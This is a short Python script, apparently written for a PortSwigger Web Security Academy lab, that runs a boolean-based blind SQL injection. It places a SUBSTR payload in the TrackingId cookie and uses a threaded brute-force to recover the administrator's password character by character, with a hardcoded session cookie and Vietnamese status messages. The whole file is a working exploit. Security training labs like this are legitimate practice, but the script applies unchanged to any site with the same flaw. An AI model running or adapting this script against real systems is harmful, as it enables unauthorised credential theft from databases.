import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "https://0aa200290420b4b8803f0d5000830048.web-security-academy.net/"
session_value = "2tHl2EyyOIAYwyw4NepjjKNm3i7f9TCo"
mark = "Welcome back"

characters = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""


def test_character(vitri, char):
    payload = (
        f"' OR SUBSTR("
        f"(SELECT password FROM users "
        f"WHERE username='administrator'),"
        f"{vitri},1)='{char}' -- "
    )

    response = requests.get(
        url,
        cookies={
            "session": session_value,
            "TrackingId": payload
        },
        timeout=10
    )

    return char if mark in response.text else None


for vitri in range(1, 32):
    print(f"Đang tìm vị trí {vitri}...")

    with ThreadPoolExecutor(max_workers=10) as executor:
        jobs = [
            executor.submit(test_character, vitri, char)
            for char in characters
        ]

        found = None

        for job in as_completed(jobs):
            result = job.result()

            if result is not None:
                found = result
                break

    if found is None:
        print("Không tìm thấy ký tự tiếp theo.")
        break

    password += found
    print("Password hiện tại:", password)

print("Password:", password)